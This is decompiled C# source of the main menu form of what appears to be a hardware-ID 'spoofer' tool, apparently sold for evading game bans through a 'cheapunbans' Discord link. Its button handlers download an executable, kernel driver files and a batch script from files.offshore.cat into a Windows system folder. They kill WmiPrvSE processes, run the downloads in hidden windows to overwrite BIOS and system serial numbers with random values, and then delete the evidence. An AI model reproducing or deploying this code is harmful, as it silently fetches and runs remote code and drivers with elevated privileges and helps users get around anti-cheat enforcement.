using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Suite;
using Spoofer_NEW.Properties;

namespace Spoofer_NEW
{
	// Token: 0x02000008 RID: 8
	[NullableContext(1)]
	[Nullable(0)]
	public partial class Menu : Form
	{
		// Token: 0x0600004D RID: 77 RVA: 0x00006D28 File Offset: 0x00004F28
		private void Form1_Paint(object sender, PaintEventArgs e)
		{
			foreach (Menu.FloatingPoint floatingPoint in this.points)
			{
				SolidBrush brush = new SolidBrush(Color.FromArgb((int)(floatingPoint.Opacity * 175f), 139, 0, 0));
				e.Graphics.FillEllipse(brush, floatingPoint.X, floatingPoint.Y, 5f, 5f);
			}
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00006DB8 File Offset: 0x00004FB8
		private void InitializeFloatingPoints()
		{
			for (int i = 0; i < 150; i++)
			{
				this.points.Add(new Menu.FloatingPoint((float)this.rand.Next(base.Width), (float)this.rand.Next(base.Height), (float)this.rand.Next(199, 299), (float)this.rand.NextDouble(), (float)(this.rand.NextDouble() * 1.0 - 1.0)));
			}
		}

		// Token: 0x0600004F RID: 79 RVA: 0x00006E4E File Offset: 0x0000504E
		private void SetupAnimationTimer()
		{
			this.animationTimer.Interval = 45;
			this.animationTimer.Tick += this.AnimationTimer_Tick;
			this.animationTimer.Start();
		}

		// Token: 0x06000050 RID: 80 RVA: 0x00006E80 File Offset: 0x00005080
		private void AnimationTimer_Tick(object sender, EventArgs e)
		{
			for (int i = 0; i < this.points.Count; i++)
			{
				Menu.FloatingPoint floatingPoint = this.points[i];
				floatingPoint.Y -= 0.5f;
				floatingPoint.X += floatingPoint.XShift;
				if (floatingPoint.Y >= 1f)
				{
					this.points[i] = floatingPoint;
				}
				else
				{
					this.points[i] = new Menu.FloatingPoint((float)this.rand.Next(base.Width), (float)base.Height, floatingPoint.Size, floatingPoint.Opacity, (float)(this.rand.NextDouble() * 2.0 - 1.0));
				}
			}
			base.Invalidate();
		}

		// Token: 0x06000051 RID: 81 RVA: 0x00006F50 File Offset: 0x00005150
		private void Form1_MouseMove(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				base.Left += e.X - this.lastPoint.X;
				base.Top += e.Y - this.lastPoint.Y;
			}
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00006FA8 File Offset: 0x000051A8
		public Menu()
		{
			this.InitializeComponent();
			this.DoubleBuffered = true;
			base.Padding = new Padding(1);
			this.InitializeFloatingPoints();
			this.SetupAnimationTimer();
			base.Paint += this.Form1_Paint;
			base.TopMost = true;
			base.StartPosition = FormStartPosition.Manual;
			int x = int.Parse(Settings.Default.LoginFormLocationX);
			int y = int.Parse(Settings.Default.LoginFormLocationY);
			base.Location = new Point(x, y);
			Settings.Default.Save();
			this.SetupAnimationTimer();
		}

		// Token: 0x06000053 RID: 83 RVA: 0x0000705E File Offset: 0x0000525E
		private void guna2Button1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000054 RID: 84 RVA: 0x00007060 File Offset: 0x00005260
		private void Form2_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x06000055 RID: 85 RVA: 0x00007062 File Offset: 0x00005262
		private void guna2Panel2_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00007064 File Offset: 0x00005264
		private void guna2Button5_Click(object sender, EventArgs e)
		{
			Application.Exit();
		}

		// Token: 0x06000057 RID: 87 RVA: 0x0000706B File Offset: 0x0000526B
		private void timer1_Tick(object sender, EventArgs e)
		{
			double opacity = base.Opacity;
			base.Opacity += 0.2;
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00007094 File Offset: 0x00005294
		private void RunCommand(string fileName, string arguments)
		{
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = fileName,
				Arguments = arguments,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			};
			using (Process process = new Process
			{
				StartInfo = startInfo
			})
			{
				process.Start();
				process.WaitForExit();
			}
		}

		// Token: 0x06000059 RID: 89 RVA: 0x000070FC File Offset: 0x000052FC
		private string GenerateRandomSerial(Random random, string characters, int length)
		{
			StringBuilder stringBuilder = new StringBuilder(length);
			for (int i = 0; i < length; i++)
			{
				stringBuilder.Append(characters[random.Next(characters.Length)]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x0600005A RID: 90 RVA: 0x0000713C File Offset: 0x0000533C
		private string daddy(Random random, string characters, int length)
		{
			StringBuilder stringBuilder = new StringBuilder(length);
			for (int i = 0; i < length; i++)
			{
				stringBuilder.Append(characters[random.Next(characters.Length)]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x0600005B RID: 91 RVA: 0x0000717C File Offset: 0x0000537C
		private string daddy2(Random random, string characters, int length)
		{
			StringBuilder stringBuilder = new StringBuilder(length);
			for (int i = 0; i < length; i++)
			{
				stringBuilder.Append(characters[random.Next(characters.Length)]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x0600005C RID: 92 RVA: 0x000071BC File Offset: 0x000053BC
		private string daddy3(Random random, string characters, int length)
		{
			StringBuilder stringBuilder = new StringBuilder(length);
			for (int i = 0; i < length; i++)
			{
				stringBuilder.Append(characters[random.Next(characters.Length)]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x0600005D RID: 93 RVA: 0x000071FC File Offset: 0x000053FC
		private void guna2Button3_Click(object sender, EventArgs e)
		{
			MessageBox.Show(string.Concat(new string[]
			{
				"This Will Take Some Time",
				Environment.NewLine,
				"Wait Until You Hear A *BEEP* Noise",
				Environment.NewLine,
				"Press OK"
			}));
			Random random = new Random();
			int length = 16;
			string characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			string str = this.GenerateRandomSerial(random, characters, length);
			string str2 = this.daddy(random, characters, length);
			string str3 = this.daddy3(random, characters, length);
			string str4 = this.daddy2(random, characters, length);
			string text = "C:\\Windows\\Globalization\\Time Zone";
			Directory.CreateDirectory(text);
			using (WebClient webClient = new WebClient())
			{
				webClient.DownloadFile("https://files.offshore.cat/aFSjhlWf.bin", Path.Combine(text, "winxsrcsv64.exe"));
				webClient.DownloadFile("https://files.offshore.cat/ptBPG25Q.sys", Path.Combine(text, "winxsrcsv64.sys"));
				webClient.DownloadFile("https://files.offshore.cat/ES7x7aUs.sys", Path.Combine(text, "iqvw64e.sys"));
			}
			Process[] processesByName = Process.GetProcessesByName("WmiPrvSE");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			Environment.CurrentDirectory = text;
			if (Process.GetProcessesByName("winxsrcsv64").Length == 0)
			{
				this.RunCommand("winxsrcsv64.exe", "/SU AUTO");
				this.RunCommand("winxsrcsv64.exe", "/BS " + str);
				this.RunCommand("winxsrcsv64.exe", "/CS " + str4);
				this.RunCommand("winxsrcsv64.exe", "/SS " + str3);
				this.RunCommand("winxsrcsv64.exe", "/SM \"System manufacturer\"");
				this.RunCommand("winxsrcsv64.exe", "/SP \"System Product Name\"");
				this.RunCommand("winxsrcsv64.exe", "/SV \"System Version\"");
				this.RunCommand("winxsrcsv64.exe", "/SK \"SKU\"");
				this.RunCommand("winxsrcsv64.exe", "/BT \"Default string\"");
				this.RunCommand("winxsrcsv64.exe", "/BLC \"Default string\"");
				this.RunCommand("winxsrcsv64.exe", "/CM \"Default string\"");
				this.RunCommand("winxsrcsv64.exe", "/CV \"Default string\"");
				this.RunCommand("winxsrcsv64.exe", "/CA \"Default string\"");
				this.RunCommand("winxsrcsv64.exe", "/CSK \"Default string\"");
				this.RunCommand("winxsrcsv64.exe", "/SF \"To be filled by O.E.M.\"");
				this.RunCommand("winxsrcsv64.exe", "/PSN " + str2);
			}
			else
			{
				this.RunCommand("winxsrcsv64.exe", "/SU AUTO");
				this.RunCommand("winxsrcsv64.exe", "/BS " + str);
				this.RunCommand("winxsrcsv64.exe", "/CS " + str4);
				this.RunCommand("winxsrcsv64.exe", "/SS " + str3);
				this.RunCommand("winxsrcsv64.exe", "/SM \"System manufacturer\"");
				this.RunCommand("winxsrcsv64.exe", "/SP \"System Product Name\"");
				this.RunCommand("winxsrcsv64.exe", "/SV \"System Version\"");
				this.RunCommand("winxsrcsv64.exe", "/SK \"SKU\"");
				this.RunCommand("winxsrcsv64.exe", "/BT \"Default string\"");
				this.RunCommand("winxsrcsv64.exe", "/BLC \"Default string\"");
				this.RunCommand("winxsrcsv64.exe", "/CM \"Default string\"");
				this.RunCommand("winxsrcsv64.exe", "/CV \"Default string\"");
				this.RunCommand("winxsrcsv64.exe", "/CA \"Default string\"");
				this.RunCommand("winxsrcsv64.exe", "/CSK \"Default string\"");
				this.RunCommand("winxsrcsv64.exe", "/SF \"To be filled by O.E.M.\"");
				this.RunCommand("winxsrcsv64.exe", "/PSN " + str2);
				Thread.Sleep(5000);
				foreach (string path in new string[]
				{
					"winxsrcsv64.exe",
					"winxsrcsv64.sys",
					"iqvw64e.sys"
				})
				{
					string path2 = Path.Combine(text, path);
					if (File.Exists(path2))
					{
						File.Delete(path2);
					}
				}
			}
			Thread.Sleep(5000);
			foreach (string path3 in new string[]
			{
				"winxsrcsv64.exe",
				"winxsrcsv64.sys",
				"iqvw64e.sys"
			})
			{
				string path4 = Path.Combine(text, path3);
				if (File.Exists(path4))
				{
					File.Delete(path4);
				}
			}
		}

		// Token: 0x0600005E RID: 94 RVA: 0x00007634 File Offset: 0x00005834
		private void guna2Button11_Click_1(object sender, EventArgs e)
		{
			try
			{
				new ProcessStartInfo().WindowStyle = ProcessWindowStyle.Hidden;
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				Random random = new Random();
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.CreateNoWindow = true;
				int length = 16;
				string characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
				this.GenerateRandomSerial(random, characters, length);
				string fileName = "C:\\Windows\\Globalization\\Time Zone\\Mac.bat";
				processStartInfo.FileName = fileName;
				using (WebClient webClient = new WebClient())
				{
					webClient.DownloadFile("https://files.offshore.cat/HW7JDMNI.bat", fileName);
				}
				Process[] processesByName = Process.GetProcessesByName("WmiPrvSE");
				for (int i = 0; i < processesByName.Length; i++)
				{
					processesByName[i].Kill();
				}
				Process.Start(processStartInfo);
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.CreateNoWindow = true;
				SystemSounds.Beep.Play();
				MessageBox.Show("Successfully Spoofed!", "Mac Spoof");
			}
			catch (Exception ex)
			{
				MessageBox.Show("An error occurred: " + ex.Message);
			}
		}

		// Token: 0x0600005F RID: 95 RVA: 0x0000773C File Offset: 0x0000593C
		private void guna2Button10_Click_1(object sender, EventArgs e)
		{
			try
			{
				new ProcessStartInfo().WindowStyle = ProcessWindowStyle.Hidden;
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				Random random = new Random();
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.CreateNoWindow = true;
				int length = 16;
				string characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
				this.GenerateRandomSerial(random, characters, length);
				string fileName = "C:\\Windows\\Globalization\\Time Zone\\Mac.bat";
				processStartInfo.FileName = fileName;
				using (WebClient webClient = new WebClient())
				{
					webClient.DownloadFile("https://files.offshore.cat/HW7JDMNI.bat", fileName);
				}
				Process[] processesByName = Process.GetProcessesByName("WmiPrvSE");
				for (int i = 0; i < processesByName.Length; i++)
				{
					processesByName[i].Kill();
				}
				Process.Start(processStartInfo);
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.CreateNoWindow = true;
				SystemSounds.Beep.Play();
				MessageBox.Show("Successfully Spoofed!", "Mac Spoof");
			}
			catch (Exception ex)
			{
				MessageBox.Show("An error occurred: " + ex.Message);
			}
		}

		// Token: 0x06000060 RID: 96 RVA: 0x00007844 File Offset: 0x00005A44
		private void guna2Button9_Click(object sender, EventArgs e)
		{
			new extra().Show();
			base.Hide();
			Settings.Default.LoginFormLocationX = base.Location.X.ToString();
			Settings.Default.LoginFormLocationY = base.Location.Y.ToString();
			Settings.Default.Save();
		}

		// Token: 0x06000061 RID: 97 RVA: 0x000078AB File Offset: 0x00005AAB
		private void guna2Button11_Click(object sender, EventArgs e)
		{
			Application.Exit();
		}

		// Token: 0x06000062 RID: 98 RVA: 0x000078B2 File Offset: 0x00005AB2
		private void guna2Button10_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		// Token: 0x06000063 RID: 99 RVA: 0x000078BB File Offset: 0x00005ABB
		private void guna2Button1_Click_1(object sender, EventArgs e)
		{
			Menu.OpenUrl("https://discord.gg/cheapunbans");
		}

		// Token: 0x06000064 RID: 100 RVA: 0x000078C8 File Offset: 0x00005AC8
		public static void OpenUrl(string url)
		{
			try
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = url,
					UseShellExecute = true
				});
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000065 RID: 101 RVA: 0x0000790C File Offset: 0x00005B0C
		private void guna2Button7_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		// Token: 0x06000066 RID: 102 RVA: 0x00007915 File Offset: 0x00005B15
		private void guna2Button5_Click_1(object sender, EventArgs e)
		{
			Application.Exit();
		}

		// Token: 0x06000067 RID: 103 RVA: 0x0000791C File Offset: 0x00005B1C
		private void guna2Button2_Click_1(object sender, EventArgs e)
		{
			new extra().Show();
			base.Hide();
			Settings.Default.LoginFormLocationX = base.Location.X.ToString();
			Settings.Default.LoginFormLocationY = base.Location.Y.ToString();
			Settings.Default.Save();
		}

		// Token: 0x06000068 RID: 104 RVA: 0x00007984 File Offset: 0x00005B84
		private void guna2Button8_Click(object sender, EventArgs e)
		{
			Control control = new misc();
			base.Hide();
			control.Show();
			Settings.Default.LoginFormLocationX = base.Location.X.ToString();
			Settings.Default.LoginFormLocationY = base.Location.Y.ToString();
			Settings.Default.Save();
		}

		// Token: 0x06000069 RID: 105 RVA: 0x000079EC File Offset: 0x00005BEC
		private void guna2Button3_Click_1(object sender, EventArgs e)
		{
			Control control = new misc();
			base.Hide();
			control.Show();
			Settings.Default.LoginFormLocationX = base.Location.X.ToString();
			Settings.Default.LoginFormLocationY = base.Location.Y.ToString();
			Settings.Default.Save();
		}

		// Token: 0x0400003D RID: 61
		private Point lastPoint;

		// Token: 0x0400003E RID: 62
		private List<Menu.FloatingPoint> points = new List<Menu.FloatingPoint>();

		// Token: 0x0400003F RID: 63
		private Random rand = new Random();

		// Token: 0x04000040 RID: 64
		private Timer animationTimer = new Timer();

		// Token: 0x02000018 RID: 24
		[NullableContext(0)]
		private struct FloatingPoint
		{
			// Token: 0x06000103 RID: 259 RVA: 0x0000CAE6 File Offset: 0x0000ACE6
			public FloatingPoint(float x, float y, float size, float opacity, float xShift)
			{
				this.X = x - 10f;
				this.Y = y - 10f;
				this.Size = size;
				this.Opacity = opacity;
				this.XShift = xShift;
			}

			// Token: 0x040000BB RID: 187
			public float X;

			// Token: 0x040000BC RID: 188
			public float Y;

			// Token: 0x040000BD RID: 189
			public float Size;

			// Token: 0x040000BE RID: 190
			public float Opacity;

			// Token: 0x040000BF RID: 191
			public float XShift;
		}
	}
}
